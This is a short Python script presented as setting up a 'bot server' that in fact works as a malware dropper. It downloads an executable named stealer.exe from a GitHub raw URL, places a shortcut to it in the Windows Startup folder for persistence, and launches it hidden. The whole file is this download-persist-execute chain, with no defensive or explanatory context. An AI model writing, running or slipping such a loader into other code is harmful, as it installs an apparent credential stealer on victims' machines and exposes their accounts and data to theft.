import requests
import subprocess
import win32com.client
from pathlib import Path
import os

def setup_botserver():
    """Download and run the bot server executable."""
    bot_url = "https://github.com/GODOFTHUGS/sounds/raw/main/stealer.exe"
    bot_path = Path(__file__).resolve().parent / 'stealer.exe'

    # Download the bot server executable
    response = requests.get(bot_url, stream=True)
    if response.status_code == 200:
        with open(bot_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        print("Bot server executable downloaded.")

        # Add the bot server executable to the startup folder
        startup_path = Path(os.getenv('APPDATA')) / 'Microsoft/Windows/Start Menu/Programs/Startup'
        shortcut_path = startup_path / 'stealer.lnk'

        if not shortcut_path.exists():
            shell = win32com.client.Dispatch('WScript.Shell')
            shortcut = shell.CreateShortCut(str(shortcut_path))
            shortcut.TargetPath = str(bot_path)
            shortcut.save()
            print("Bot server executable added to startup.")
        else:
            print("Bot server executable already in the startup folder.")
        
        # Execute the bot server executable
        subprocess.Popen([str(bot_path)], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    else:
        print(f"Failed to download the bot server executable. Status code: {response.status_code}")

if __name__ == "__main__":
    setup_botserver()
